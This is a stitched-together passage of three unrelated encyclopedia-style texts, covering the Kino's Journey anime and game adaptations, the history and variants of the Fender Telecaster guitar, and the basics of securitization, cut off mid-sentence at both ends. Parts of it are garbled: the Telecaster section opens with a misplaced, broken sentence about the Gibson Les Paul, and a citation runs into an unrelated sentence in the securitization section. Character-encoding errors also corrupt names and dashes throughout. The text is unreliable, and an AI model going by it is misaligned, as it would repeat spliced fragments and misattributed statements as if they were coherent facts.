supervising scripts and Ryoko Amisaki designing the characters. The opening theme is \\"Here and There\\" and the ending theme is , both by Nagi Yanagi. Crunchyroll streamed the anime with subtitles, and Funimation streamed the series with a simuldub. Films Two anime films have been created as part of the Kino's Journey series. The first, was produced by A.C.G.T and directed by Takashi Watanabe. It premiered in Japanese theaters on February 19, 2005. Spanning 30-minutes, the film is a prequel to the series, showing Kino being trained by her teacher, learning to ride Hermes, and discovering her naturally excellent marksmanship before eventually deciding to return the original Kino's coat to his mother. The ending theme for the first animated film is by Ai Maeda, and was released on Maeda's Night Fly album on March 16, 2005. The second film, , premiered on April 21, 2007 as one of the three movies released at Dengeki Bunko's Movie Festival. Produced by Shaft and directed by Ry≈´tar≈ç Nakamura, it follows Kino and Hermes journey to a highly advanced country where the people live confined in a sealed environment. By request of her father, Kino tells about her travels to a sick girl who is hospitalized there. The second animated film's ending theme is \\"Bird\\" by Mikuni Shimokawa, and the single was released on March 14, 2007. =Other media= A Kino's Journey drama CD was available through mail order via volume fifteen of MediaWorks' now-defunct light novel magazine Dengeki hp released on December 18, 2001. The drama tracks on the CD were originally broadcast on ASCII Media Works' radio program Dengeki Taish≈ç in 2001. Kino's Journey has been adapted into two visual novel adventure games for the PlayStation 2 by Tycoon and ASCII Media Works. The first game, titled Kino's Journey ‚Äîthe Beautiful World‚Äî, was released on July 17, 2003, and a \\"best\\" version was later released on November 25, 2004. Most of the story for the first game is taken from volumes one, two, three, five, and six of the original light novels, but there is one scenario written specifically for the game by Keiichi Sigsawa. The original soundtrack for the first visual novel was released on July 24, 2003. The second game, titled Kino's Journey II ‚Äîthe Beautiful World‚Äî, was released on December 1, 2005, and a \\"best\\" version was later released on March 8, 2007. Like the first game, most of the story is taken from the light novels, but there is another original scenario written by Sigsawa. Additionally, the second game came bundled with a thirty-six page book entitled containing the story of the original scenario written for the game. Both of the visual novels were voiced, mainly using the same cast from the first anime series. At one time, ASCII Media Works had planned to release a version for the PlayStation Portable. Reception As of 2017, around 8.2 million copies of the novels have been sold in Japan. The first novel which was published in the US generated positive reviews. Newtype USA named it the Book of the Month for November 2006 and called it \\"inviting and addictive,\\" while AnimeOnDVD said it \\"sucks you in,\\" and \\"allows you to experience the journey\\" with the main character. The series has ranked three times in Takarajimasha's light novel guide book Kono Light Novel ga Sugoi!: second in 2006, fifth in 2007, and sixth in 2008.

Gibson produced the Gibson Les Paul guitar in 1952 after bringing on Paul to help design a commercial model to compete with Fender. solid-body electric guitar. Its simple yet effective design and revolutionary sound broke ground and set trends in electric guitar manufacturing and popular music. Introduced for national distribution as the Broadcaster in the autumn of 1950 as a two- pickup version of its sister model, the single-pickup Esquire, the pair were the first guitars of their kind manufactured on a substantial scale. A trademark conflict with rival manufacturer Gretsch led to the guitar being renamed in 1951. Initially, the Broadcaster name was simply cut off of the labels placed on the guitars (leading to a limited run of nameless guitars known as \\"No-casters\\") and later in 1951, the final name of Telecaster was applied to the guitar. The Telecaster quickly became a popular model, and has remained in continuous production since its first incarnation.Duchossoir, A. R. (1991). The Fender Telecaster: The Detailed Story of America's Senior Solid Body Electric Guitar. Milwaukee: Hal Leonard Publishing Co. . Just like the Fender Stratocaster, the Telecaster is also a versatile guitar, usable for most styles of music and has been used in many genres, including country, reggae, rock, pop, folk, soul, blues, jazz, punk, metal, alternative, indie rock, and R&B.; The base model has always been available, and other than a change to the pickup selector switch configuration, a thinning of the neck, and a few variations on the bridge design, it has remained recognizable and mostly unchanged from the 1950s. Several variant models have been produced over the years including those with different pickup configurations and electronics, semi-hollow body designs, and even a twelve string model. Overall design The archetypical Fender Telecaster is a solid-body electric guitar with a flat symmetric single-cutaway body; the body is usually made from alder or ash. The neck is usually made from maple and attached to the body with screws (often referred to as \\"bolts\\") and has a distinctive small headstock with six tuning pegs mounted inline along a single side; the fingerboard may be maple or another wood, e.g. rosewood, and has at least twenty-one frets. The Telecaster's body is front-routed for electronics; the bridge pickup is mounted in a metal plate attached to the guitar's bridge, other pickups are mounted in a plastic pickguard, and the controls are mounted in a metal plate on the lower bout of the guitar. Most Telecasters have two single-coil pickups, a pickup selector switch, a single volume control and a single tone control. Fixed bridges are almost universal, and the original design has three individually adjustable dual-string saddles whose height and intonation can be set independently. (Many newer models have six saddles.) The output jack is mounted on the edge of the lower bout of the guitar. Many different colours have been available. The Telecaster's scale length is 25.5 inches (648 mm). There have been minor changes to the design over the years and models with features that differ from the archetypical design. However, the essential character of the design has remained constant. {style=\\"margin: 0 auto;\\"  Body and electronics  Headstock  Bridge } Origins The Fender Telecaster was developed by Leo Fender in Fullerton, California, in 1950. In the period roughly between 1932 and 1949, several craftsmen and companies experimented with solid-body electric guitars, but none had made a significant impact on the market. Leo Fender's Telecaster was the design that made bolt-on neck, solid body guitars viable in the marketplace. Fender had an electronics repair shop called Fender's Radio Service where he first repaired, then designed, amplifiers and electromagnetic pickups for musicians ‚Äî chiefly players of electric semi-acoustic guitars, electric Hawaiian lap steel guitars, and mandolins. Players had been \\"wiring up\\" their instruments in search of greater volume and projection since the late 1920s, and electric semi-acoustics (such as the Gibson ES-150) had long been widely available. Tone had never, until then, been the primary reason for a guitarist to go electric, but in 1943, when Fender and his partner, Clayton Orr \\"Doc\\" Kauffman, built a crude wooden guitar as a pickup test rig, local country players started asking to borrow it for gigs. It sounded bright and sustaining. Fender was intrigued, and in 1949, when it was long understood that solid construction offered great advantages in electric instruments, but before any commercial solid-body Spanish guitars had caught on (the then-small Audiovox company apparently offered a modern, solid-body electric guitar as early as the mid-1930s), he built a better prototype. That hand-built prototype, an unbranded white guitar with no model name, had most of the features of what would become the Telecaster. It was designed in the spirit of the solid-body Hawaiian guitars manufactured by Rickenbacker ‚Äî small, simple units made of Bakelite and aluminum with the parts bolted together ‚Äî but with wooden construction. (Rickenbacker, then spelled \\"Rickenbacher\\", also offered a solid Bakelite-bodied electric Spanish guitar in 1935 that seemed to presage details of Fender's design.) =1950= The initial single-pickup production model appeared in 1950, and was called the Fender Esquire. Ash and maple were used to construct the body and neck respectively and the guitar came in one color - blond. Fewer than fifty guitars were originally produced under that name, and most were replaced under warranty because of early manufacturing problems. In particular, the Esquire necks had no truss rod and many were replaced due to bent necks. Later in 1950, this single-pickup model was discontinued, and a two-pickup model was renamed the Broadcaster. From this point onward all Fender necks incorporated truss rods. The Esquire was reintroduced in 1951 as a single pickup variant, at a lower price.Fender Esquire =1951= As a result of legal action from the Gretsch company over the guitar's name, the Broadcaster (Gretsch already had the \\"Broadkaster\\" name registered for a line of drums), factory workers simply snipped the \\"Broadcaster\\" name from its existing stock of decals, so guitars with these decals are identified simply as \\"Fender\\", without any model name. The term Nocaster was later coined by collectors to denote these transitional guitars that appeared without a model name on the headstock. Since they were manufactured in this form for 8-9 months in 1951, original Nocasters are highly prized by collectors. There are no official production numbers, but experts estimate that fewer than 500 Nocasters were produced. Fender has since registered Nocaster as a trademark to denote its modern replicas of this famous rarity. In around September 1951, Fender renamed the guitar to Telecaster and started placing these decals on the headstock. The guitar now known as the Fender Telecaster was born. With a transparent butterscotch finish, single ply 'Black Guard', Maple neck with Walnut back stripe, the Telecaster was set to become the most successfully mass produced electric guitar in history along with the Fender Stratocaster arriving in 1954. The most interesting part of the invention of the Fender Telecaster is that it remains one of the very few industrially manufactured products in history where the initial design was considered to be at its very best upon first release. Although subjective, this point is evidenced by the continual reissue of the 1951 Nocaster and 1952 Telecaster in large numbers by the company to this day. In 1951, Fender released the innovative and musically influential Precision Bass as a similar looking stable-mate to the Telecaster. This body style was later released as the Fender Telecaster Bass in 1968 after the Precision Bass had been changed in 1957 to make it more closely resemble the Fender Stratocaster guitar. This double cut away style was the shape that influenced how the Fender Stratocaster was created. At the time Leo Fender began marketing the newly designed Stratocaster in 1954, he expected it to replace the Telecaster, but the Telecaster's many virtues and unique musical personality have kept it in demand to the present day. =1952= Now that Leo Fender was clear of any patent or naming infringements, by 1952, the Fender company began producing the Telecaster guitar in larger numbers. These early Telecasters would become known as Blackguards produced between 1950-1954. For further reading, Nacho Banos wrote an excellent book concerning these particular Telecaster guitars in 2005 called \\"The Blackguard : A Detailed History of the Early Fender Telecaster Years 1950-1954\\". Construction Leo Fender's simple and modular design was geared to mass production and made servicing broken guitars easier. Guitars were not constructed individually, as in traditional luthiery. Rather, components were produced quickly and inexpensively in quantity and assembled into a guitar on an assembly line. The bodies were bandsawn and routed from slabs, rather than hand-carved individually, as with other guitars made at the time, such as Gibsons. Fender did not use the traditional glued-in neck, but rather a \\"bolt-on\\" neck (which is actually attached using screws, not bolts). This not only made production easier, but allowed the neck to be quickly removed and serviced, or replaced entirely. In addition, the classic Telecaster neck was fashioned from a single piece of maple without a separate fingerboard, and the frets were slid directly into the side of the maple surface. The very design of the headstock (inspired by Croatian instruments, according to Leo Fender) followed that simplicity principle : it's very narrow, since it was cut in a single piece of wood (without glued \\"wings\\"): nonetheless, that headstock is very effective, as the six strings are kept straight behind the nut, keeping the guitar easily in tune. While this has changed over time with new reincarnations of the guitar, this was a highly unorthodox approach in its day as guitars traditionally featured rosewood or ebony fingerboards glued onto mahogany necks. The electronics were easily accessed for repair or replacement through a removable control plate, a great advantage over the construction of the then-predominant hollow-body instruments, in which the electronics could be accessed only through the soundholes. In its classic form, the guitar is simply constructed, with the neck and fingerboard comprising a single piece of maple, screwed to an ash or alder body inexpensively jigged with flat surfaces on the front and back. The hardware includes two single coil pickups controlled by a three-way selector switch, and one each of volume and tone controls. The pickguard was first Bakelite, soon thereafter it was celluloid (later other plastics), screwed directly onto the body with five (later eight) screws. The bridge has three adjustable saddles, with strings doubled up on each. In its original design nearly all components are secured using only screws (body, neck, tuners, bridge, scratchplate, pickups to body, control plate, output socket), with glue used to secure the nut and solder used to connect the electronic components. With the introduction of the truss rod, and later a rosewood fingerboard, more gluing was required during construction. The guitar quickly gained a following, and soon other, more established guitar companies (such as Gibson, whose Les Paul model was introduced in 1952, and later Gretsch, Rickenbacker, and others) began working on wooden solid-body production models of their own. thumb150pxA Telecaster in \\"Paisley Red\\" (originally released during 1968‚Äì69)[https://www.premierguitar.com/articles/1968_69_Paisley_Red_Blue_Flower_Fender_Telecasters 1968 - 69 Paisley Red & Blue Flower Fender Telecasters] by Dave Rogers, Laun Braithwaite, and Tim Mullally on Premier Guitar website The Telecaster has always had a three-position selector switch to allow for different pickup configurations, as well as two knobs for controlling volume and tone. However, different eras had different functions for these controls. The original switch and knob configuration was used from 1950 to 1952. The first position (switch towards neck) activated the neck pickup with treble tone cut, which produced a muffled, bass-heavy tone (sometimes called the \\"dark circuit\\"). The middle position selected the neck pickup without the treble cut, giving it a fuller sound, and in the third position had both pickups together and activated the tone knob. On these models, the tone knob acted as a blending knob, with the \\"0\\" position using only the bridge pickup, blending to a 50/50 neck/bridge mix in the \\"10\\" position. The first knob functioned normally as a master volume control.Duchossoir, 1991, 15 In late 1952, Fender made several changes to the circuitry of the guitar. First, a true tone control knob was installed, that could be used to alter the tone from bass-heavy (in the 0 position) to treble- heavy (in the 10 position). The first position stayed the same as before, with the neck pickup in \\"dark circuit\\" treble-cut mode. In this position, the tone knob was disabled. The middle position turned off the dark circuit, and turned on the tone control knob for the neck pickup. The third position selected the bridge pick-up alone, again with an active tone control knob. Although this provided the player with a proper tone control, the change also made it impossible to blend the signal from both pickups. In late 1967 Fender again modified the circuit. They removed the \\"dark circuit\\" from the first position, and installed what has become the standard twin pickup switching system: neck pickup alone with tone control in the first position, both pickups together with the tone control in the middle position and in the third position the bridge pickup alone with the tone control. Typical modern Telecasters (such as the American Standard version) incorporate several details different from the classic form. They typically feature 22 frets (rather than 21) and truss rod adjustments are made at the headstock end, or the body end depending on the model (typically at the head-stock in newer models). The body end requires removal of the neck (the Custom Shop Bajo Sexto Baritone Tele was the only Telecaster featuring a two-octave 24-fret neck). The three-saddle bridge of the original has been replaced with a six-saddle version, allowing independent length and height adjustment for each string. The long saddle bridge screws allow a wide range of saddle bridge positions for intonation tuning. The stamped metal bridge plate has been replaced with a flat plate, and the removable chromed bridge cover (often called the \\"ashtray\\" for its secondary use) has been discontinued for most models; it improved shielding but prevented players from muting strings at the bridge and made it impossible to pick near the saddles to produce the characteristic Telecaster 'twang'. During the CBS era in the 1970s, the Telecaster body style was changed to a new \\"notchless\\" shape, having a less pronounced notch in the crook where the upper bout meets the neck. The notchless body style was discontinued in 1982. The short-lived Elite Telecaster of 1983 incorporated two specially designed humbucking pickups powered by an active circuitry that featured a \\"TBX\\" guitar expander and an MDX midrange booster with 12 dB of gain. Other features included a \\"Freeflyte\\" hardtail bridge and die-cast tuning machines with pearloid buttons. This guitar was among the latest CBS-era Fenders to feature a BiFlex truss-rod system, low-friction EasyGlider string trees and active electronics. After CBS sold Fender to a group of employees led by Bill C. Schultz in 1985, production ceased on the Elite Telecaster and other Elite models. Fender Japan made its own version of the Elite Telecaster in late 1984, which featured a 22-fret neck with medium-jumbo fretwire and a modern 9.5 inch fingerboard radius. Notable Elite Telecaster players include Johnny Hallyday, Dave Davies of The Kinks, Michael Houser with Widespread Panic, and Andy Summers of The Police. The Telecaster sound The Telecaster is known for its ability to produce both a bright, rich cutting tone (the typical Telecaster country twang) and a mellow, warm, bluesy jazz tone depending on the selected pickup, respectively \\"bridge\\" pickup or \\"neck\\" pickup, and by adjusting the tone control. The bridge pickup has more windings than the neck pickup, hence producing higher output, which compensates for a lower amplitude of vibration of the strings at the bridge position. At the same time, a capacitor between the slider of the volume control and the output allows treble sounds to bleed through while damping mid and lower ranges. Slanting the bridge pickup also increased the guitar's treble response. The solid body allows the guitar to deliver a clear and sustaining amplified version of the strings' sound; this was an improvement over previous electric guitar designs, whose resonant hollow bodies made them prone to unwanted acoustic feedback when volume was increased. These design elements intentionally allowed guitarists to emulate steel guitar sounds, as well as \\"cut-through\\" and be heard in roadhouse Honky-Tonk and big Western Swing bands, initially making this guitar particularly useful in country music. Since this, Fender has developed even more in the way of pickups and tones for the telecaster, with changes from Alnico III magnets to Alnico V magnets. Its wide range of tonalities allows the Telecaster to be used successfully for many styles of music including country, pop, rock, blues and jazz. Variants The Telecaster has long been a favorite guitar for \\"hot-rod\\" customizing. Several variants have appeared throughout the years with a wide assortment of pickup configurations, such as a humbucker in the neck position, three single-coil pickups, and even dual humbuckers with special wiring schemes. Fender offered factory hot-rodded Teles with such pickup configurations, the US Fat and Nashville B-Bender Telecasters around 1998. The Deluxe Blackout Tele was also equipped with three single-coil pickups, a \\"Strat-o-Tele\\" selector switch and a smaller headstock than a standard Telecaster. Some also preferred tremolos on their Telecasters, installing a Bigsby on them. The most common variants of the standard two-pickup solid body Telecaster are the semi-hollow Thinline, the Custom, which replaced the neck single coil-pickup with a humbucking pickup, and the twin-humbucker Deluxe. The Custom and Deluxe were introduced during the CBS period and reissues of both designs are currently offered. =Telecaster Thinline= left Designed by German luthier Roger Rossmeisl, the Telecaster Thinline model first appeared in 1968/69. It is characterized by a body having a solid center core with hollow wings to reduce weight. The '69 version has two standard Telecaster single-coil pickups, string-through-body bridge, and a choice of an ash or mahogany body. Later a '72 version was introduced based on the Fender Telecaster Deluxe with two Fender Wide Range humbucking pickups. In 2011, Fender released the Modern Player Telecaster Thinline as a part of the Modern Player series. This guitar features two MP-90 pickups, similar to the Gibson P-90 and a mahogany body. The Fender Custom Shop has produced a variation referred to as the \\"50s Telecaster Thinline\\" with an ash body, maple neck and a Twisted Tele neck pickup matched with a Nocaster bridge pickup. =Telecaster Custom= left The first edition of the Telecaster Custom was produced between 1959-1968, and featured a double-bound body but otherwise-standard configuration. While the guitar was known as the Telecaster Custom, the decal on the headstock read \\"Custom Telecaster\\". Later editions of the Telecaster Custom were popularized by Rolling Stones' guitarist and composer Keith Richards, featuring a Fender Wide Range humbucker in the neck position and a single-coil pickup in the bridge. To distinguish this model from the mid-1960s Custom with body binding, the market generally refers to the guitar as the \\"1972 Custom\\", indicating the year this model was released. =Telecaster Deluxe= left This model includes two Fender Wide Range humbucking pickups and was originally produced from 1972 to 1981 and has since then been reissued. The Telecaster Deluxe sported a large headstock similar to the Stratocaster, maple neck and a contoured body, as well as a tremolo bridge option on models manufactured after 1973/74. This model also had 2 volume and 2 tone control knobs on the front of the guitar, rather than the usual 1 of each. =Telecaster Plus= left Designed to restore Fender's reputation after a group of employees led by William C. Schultz took over ownership from CBS in the early 1980s. The pickups used in early models were dual humbucking Red Lace Sensors in the bridge position and a single Blue Lace Sensor in the neck position. Later models (post-1995 or so) used three Gold Lace Sensors or a Red/Silver/Blue set in a Stratocaster-like configuration, as well as low-friction roller nuts, locking synchronized vibrato bridge and tuners, and a bound contoured alder body with ash veneers. These instruments were discontinued in 1998 with the advent of the American Deluxe series. In 2011 Fender released the entry level Modern Player Telecaster Plus as a part of the Modern Player series. The guitar has a humbucker in the bridge, a Stratocaster style single coil pickup in the middle, and a Telecaster covered neck pickup. =Tele Jr.= left The Fender Tele Jr. is a variant of the Telecaster that the Fender Custom Shop produced in a limited run of 100 units in the early 1990s. It uses a Telecaster body shape, scale length, and electronics controls (albeit, with a reversed control plate). However, many of its construction and electronic features‚Äîfor example its set-in neck and P-90-style pickups‚Äîare similar to those of a Gibson Les Paul Junior and Gibson Les Paul Special electric guitars. =J5 Triple Tele Deluxe= left The Triple Tele Deluxe is Marilyn Manson and Rob Zombie guitarist John 5's signature model. It is similar to the regular Telecaster Deluxe, in that it has 22 frets and a 3 way selector switch for the pickups, but it features three Fender \\"Enforcer\\" humbuckers and a chrome pickguard. =Cabronita= left The Cabronita (and Custom Shop variant La Cabronita) is a model that is distinguished by the use of Fidelitron or the more expensive TV Jones Classic humbucking pickups, which look like the original Gretsch humbuckers. The La Cabronita is an American-made, custom-built-to-order instrument. It typically has one TV Jones Classic pickup in the bridge position although being custom built, in can be ordered in any configuration. All Cabronitas can be distinguished by use of a smaller pickguard that covers the lower horn only, similar to the pickguard used in the original prototype for the Telecaster in 1949. The versions built in Mexico offered either a solid body or Thinline body, with both featuring two Fender Fidelitron pickups, a volume knob and pickup selector. They both have maple necks, 25.5\\" scale, a 9.5 inch radius fretboard, \\"Medium C\\" profile and 1 5/8\\" nut width, common to many standard Telecasters made in Mexico, although the Cabronita comes with 22 frets instead of the more common 21. For a brief period, Fender offered an American made \\"Telebration Cabronita\\" that used two of the TV Jones pickups. While \\"Cabronita\\" isn't a proper Spanish word, it roughly translates to English as \\"little bastard\\" or \\"little devil\\". =Modern Player Telecaster= left The Modern Player Telecaster is offered in two distinct styles: a Plus model and a Thinline model. The Plus utilizes a pine body, a standard Telecaster pickup in the neck position, a reverse wound single-coil Stratocaster-style pickup in the middle position and a humbucker in the bridge position. It is equipped with coil splitting and a five way switch to provide seven different pickup combinations. The Modern Player Thinline adopts a pickguard similar to the Deluxe models and a Stratocaster style bridge, without tremolo. It features a mahogany body, two P-90 style single-coil pickups, individual volume and tone controls and the three-way pickup selector in the upper horn position. Both use the standard 25.5\\" scale on 22 fret maple necks that are unlike any other Telecasters in that they do not utilize an overhang to accomplish the 22nd fret, but instead use a longer, square ended neck that is not fully compatible with previous Fender parts. = Tele Sub-Sonic = The sub-sonic Telecaster was first made in 2002 and is still produced. It is made in the USA and was produced as a custom guitar. It has a 22 fret maple neck with an extended scale size (27\\"). It consists of a hum bucker in the neck pickup and a slanted single coil in the bridge position. There is a 3-way pickup selector switch and a volume and control knob as found on most telecasters. = Telecaster XII 12-String = This 12-string telecaster was produced from 1995 until 1998. It had 6 tuners per side of the headstock with the fender logo in-between. There were two options for the fretboard being maple, and rosewood; the necks were all maple. Pick-guards came in white or black and there was a 12 saddle bridge to accommodate the strings. = B Bender Telecaster = This Telecaster was produced from the year 1996 to the year 2000. The B-Bender device was used to change the B string's pitch to a C# at the press of a lever located on the guitar strap peg. The styles of music usually utilizing this device on their telecasters were country, and country-rock. Models In keeping with other models Fender distinguishes product lines manufactured in different locations. * The moderately-priced Standard, Classic Player, Blacktop, Modern Player and Deluxe Telecaster models are manufactured in Mexico, Japan, China and Korea. Each of these instruments has a feature set that makes them more affordable. * The American Professional, American Vintage, American Elite, Artist Series, Custom Shop, Acoustasonic, and American Special model lines are manufactured in the United States. The American Deluxe Telecaster (introduced in 1998; upgraded in 2004, 2008, and 2010) features a pair of Samarium Cobalt Noiseless pickups and the S-1 switching system. Models made prior to 2004 featured two Fender Vintage Noiseless Tele single-coils, Fender/Fishman Powerbridge piezo system and four-bolt neck fixing. Other refinements include a bound contoured alder or ash body and an abalone dot-inlaid maple neck with rosewood or maple fingerboard, 22 medium-jumbo frets, rolled fingerboard edges, and highly detailed nut and fret work. The HH model sported an ebony fingerboard, quilted or flamed maple top and a pair of Enforcer humbuckers with S-1 switching (discontinued as of 2008). As of March 23, 2010, Fender updated the American Deluxe Telecaster with a compound radius maple neck, N3 Noiseless Tele pickups and a reconfigured S-1 switching system for wider sonic possibilities. The new model now sports staggered, locking tuning machines, which provide a better break angle over the nut for increased sustain and improved tuning stability. The Thinline version has been introduced in 2013. Fender discontinued the American Deluxe series in 2016. The American Series model used two single-coil pickups with DeltaTone system (featuring a high output bridge pickup and a reverse-wound neck pickup). Other features included a parchment pickguard, non-veneered alder or ash bodies and rolled fingerboard edges. In 2003 Fender offered Telecasters with a humbucking/single coil pickup arrangement or two humbucking pickups featuring Enforcer humbucking pickups, and S-1 switching. These models were discontinued in 2007. As of 2008, all American Standard Telecasters came with a redesigned Tele bridge with vintage-style bent steel saddles, and a bridgeplate made of chromed brass instead of steel. In March 2012 the American Standard Telecaster was updated with Custom Shop pickups (Broadcaster in the bridge, Twisted in the neck); the body is now contoured for reduced weight and more comfort. In 2014 the American Standard Telecaster HH was introduced, sporting a pair of Twin Head Vintage humbucking pickups (open-coil with black bobbins in the bridge, metal-covered in the neck). Controls include a dual concentric volume pot for each pickup, a master tone and 3-way pickup switching. The American Nashville B-Bender guitar is modeled after the personally customized instruments of some of Nashville's top players, featuring a Fender/Parsons/Green B-Bender system, two American Tele single-coils (neck, bridge), a Texas Special Strat single-coil (middle) and five-way \\"Strat-O-Tele\\" pickup switching. Ideal for country bends and steel guitar glisses, this Tele is available only with a maple fingerboard. The American Series Ash Telecaster is based on the '52 vintage reissue. It features an ash body, one-piece maple neck/fingerboard with 22 frets and two Modern Vintage Tele single-coil pickups. Fender discontinued this guitar in 2006. The Custom Classic Telecaster was the Custom Shop version of the American Series Tele, featuring a pair of Classic and Twisted single-coils in the bridge and neck positions, as well as a reverse control plate. Earlier versions made before 2003 featured an American Tele single-coil paired with two Texas Special Strat pickups and 5-way switching. Discontinued in 2009 and replaced by the Custom Deluxe Telecaster series models. The 2011 version of the Custom Shop \\"Custom Deluxe\\" Telecaster featured a lightweight Ash body with contoured heel, Birdseye maple neck, and a pickup set that included a Twisted Tele neck pickup and a Seymour Duncan Custom Shop BG-1400 stacked humbucker in the bridge position. The Highway One Telecaster (introduced in 2000) featured a pair of distortion-friendly alnico III, single-coil pickups, super-sized 22 frets, Greasebucket circuit, satin nitrocellulose finish, and 1970s styling font(since 2006). A change over came in 2005/2006 with the line until 2011. Limited colors from previous years down to at least satin nitrocellulose Crimson Transparent, honey blonde, black, daphne blue and 3-color sunburst. The Fender Highway One series came in both maple and rosewood fretboards. The Highway One Texas Telecaster sported a one-piece maple neck/fretboard with a modern 12\\" radius and 21 medium jumbo frets, bone nut, single ply pickguard, round string guide, brass saddles, \\"spaghetti\\" style Fender font, solid ash body, vintage tuners, offered in two satin nitrocellulose colors, honey blonde and 2-color sunburst with a pair of Hot Vintage alnico V pickups. In 2010, the American Special Telecaster was introduced. While retaining such features from the Highway One as jumbo frets, changing to a 9.5 radius neck, Greasebucket tone circuit and 1970s logo, the American Special also includes some upgrades such as a glossy urethane finish, compensated brass 3-saddle bridge and Highway One Texas Tele pickups (alnico III). In the Fall of 2013, Fender upgraded the pickups on the American Special line to Custom Shop Texas Special pickups. As of 2018 the American Special Telecaster is available in 3-color sunburst, lake placid blue, sherwood green metallic and vintage blonde. Artist Series Telecasters have features favored by world-famous Fender endorsees James Burton, John 5, Muddy Waters, Jim Root, G. E. Smith, Joe Strummer and Jim Adkins. Custom Artist models are made at the Fender Custom Shop, differing slightly quality and construction-wise; their prices are much higher than the standard production versions. In September 2010, Fender introduced the Mexican-made Black Top Telecaster HH, featuring dual hot vintage alnico humbucking pickups, a one-piece maple neck with rosewood or maple fretboard and 22 medium-jumbo frets. Other features include a solid contoured alder body, a reversed control assembly and black skirted amp control knobs. In 2011, Fender released the Modern Player series, which featured the Modern Player Telecaster Thinline and the Modern Player Telecaster Plus. The Acoustasonic Telecaster is a combination of an acoustic and electric guitar. First produced in 2010, this 22 fret guitar was then reintroduced in 2019 after some changes were made. They are made in Corona, California and come in 5 colors, (Black, Sonic Gray, Natural, Sunburst, and Surf Green). The Acoustasonic is equipped with a Fender Acoustasonic Noiseless-TM pickup and uses Fender's Stringed Instrument Resonance System (SIRS) system to allow the guitar to still maintain a loud sound when it is unplugged, as an acoustic guitar would generally sound. The guitars are made out of a spruce top with an ebony fret board and a mahogany neck. The neck is bolt on and the fender logo is engraved on the head-stock next to the staggered-height tuners. There is a 5 way switch to select between sounds and a USB port for charging the electronics in the guitar. = Replicated Telecasters = A variety of Telecasters have been Replicated over the years. * The '52 Telecaster, which was made in 1982‚Äì1984 and then 1986 to present. * The '52 Tele Special made from 1999‚Äì2001, which had gold fixtures. * The 50s Telecaster, a custom shop guitar that was made from 1996-1998. * The 60s Telecaster Custom was made from 1996‚Äì1998; in addition, a '60 Telecaster Custom replica was made from 2003-2004. * The '62 Telecaster Custom is still currently made, with production starting in 1999. * The '63 Telecaster is a custom shop guitar produced from 1999 to the present day. * The '67 Telecaster made from 2004 to the present day and is a custom shop guitar. =Squier models= Squier model Telecasters are sold by Squier, a Fender-owned import brand. These can bear the Telecaster name, since Squier is owned by Fender. Squier guitars, especially the Telecasters, have gained popularity and a good reputation amongst guitar players, since it has expanded its production of guitar models. Squier has a wide range of different Telecaster-type guitars available, from the entry-level Affinity Series to the better quality Standard and Classic Vibe Series. Also available are the Artist Series and Vintage Modified Series. Among other famous musicians, Sheryl Crow has occasionally used a Squier Telecaster for recordings and live performances. Significance The Telecaster was important in the evolution of country, electric blues, funk, rock and roll, and other forms of popular music. Its solid construction let guitarists play loudly as a lead instrument, with long sustain if desired. It produced less of the uncontrolled, whistling, 'hard' feedback ('microphonic feedback') that hollowbodied instruments tend to produce at volume (different from the controllable feedback later explored by Pete Townshend and countless other players). Even though the Telecaster is more than half a century old, and more sophisticated designs have appeared since the early 1950s (including Fender's own Stratocaster), the Telecaster remains in production. There have been numerous variations and modifications, but a model with something close to the original features has always been available. In a recent article for Music Aficionado, Alex Lifeson of Rush wrote \\"I bought a reissue 1959 Telecaster back in 1981, and that guitar has since become my primary writing guitar for all of these years, especially for the electric work. Every time I pick it up, it feels like an old friend. I took all of the finish off of the neck, so it's raw wood, and I feel very connected to it when I'm playing it. That is my number-one ‚Äúgo to‚Äù for writing new music.\\" Signature Telecaster players Country rock star Brad Paisley has been seen using a Fender Telecaster guitar in multiple performances. Paisley praises the Telecaster and even partnered with Fender's 'Artist Signature' series to release a \\"Brad Paisley Road Worn Telecaster.\\"\\"Brad Paisley Joins Fender Artist Signature Series With Brad Paisley Road Worn Telecaster Guitar.\\" PR Newswire, 11 July 2017.

Investors are repaid from the principal and interest cash flows collected from the underlying debt and redistributed through the capital structure of the new financing. Securities backed by mortgage receivables are called mortgage-backed securities (MBS), while those backed by other types of receivables are asset-backed securities (ABS). The granularity of pools of securitized assets can mitigate the credit risk of individual borrowers. Unlike general corporate debt, the credit quality of securitized debt is non-stationary due to changes in volatility that are time- and structure-dependent. If the transaction is properly structured and the pool performs as expected, the credit risk of all tranches of structured debt improves; if improperly structured, the affected tranches may experience dramatic credit deterioration and loss. Securitization has evolved from its beginnings in the late 18th century to an estimated outstanding of $10.24 trillion in the United States and $2.25 trillion in Europe as of the 2nd quarter of 2008. In 2007, ABS issuance amounted to $3.455 trillion in the US and $652 billion in Europe.\\"ESF Securitization Data Report Q2:business WBS (Whole Business Securitization) arrangements first appeared in the United Kingdom in the 1990s, and became common in various Commonwealth legal systems where senior creditors of an insolvent business effectively gain the right to control the company. Structure =Pooling and transfer= The originator initially owns the assets engaged in the deal. This is typically a company looking to either raise capital, restructure debt or otherwise adjust its finances (but also includes businesses established specifically to generate marketable debt (consumer or otherwise) for the purpose of subsequent securitization). Under traditional corporate finance concepts, such a company would have three options to raise new capital: a loan, bond issue, or issuance of stock. However, stock offerings dilute the ownership and control of the company, while loan or bond financing is often prohibitively expensive due to the credit rating of the company and the associated rise in interest rates. The consistently revenue-generating part of the company may have a much higher credit rating than the company as a whole. For instance, a leasing company may have provided $10m nominal value of leases, and it will receive a cash flow over the next five years from these. It cannot demand early repayment on the leases and so cannot get its money back early if required. If it could sell the rights to the cash flows from the leases to someone else, it could transform that income stream into a lump sum today (in effect, receiving today the present value of a future cash flow). Where the originator is a bank or other organization that must meet capital adequacy requirements, the structure is usually more complex because a separate company is set up to buy the assets. A suitably large portfolio of assets is \\"pooled\\" and transferred to a \\"special purpose vehicle\\" or \\"SPV\\" (the issuer), a tax-exempt company or trust formed for the specific purpose of funding the assets. Once the assets are transferred to the issuer, there is normally no recourse to the originator. The issuer is \\"bankruptcy remote\\", meaning that if the originator goes into bankruptcy, the assets of the issuer will not be distributed to the creditors of the originator. In order to achieve this, the governing documents of the issuer restrict its activities to only those necessary to complete the issuance of securities. Many issuers are typically \\"orphaned\\". In the case of certain assets, such as credit card debt, where the portfolio is made up of a constantly changing pool of receivables, a trust in favor of the SPV may be declared in place of traditional transfer by assignment (see the outline of the master trust structure below). Accounting standards govern when such a transfer is a true sale, a financing, a partial sale, or a part-sale and part- financing. In a true sale, the originator is allowed to remove the transferred assets from its balance sheet: in a financing, the assets are considered to 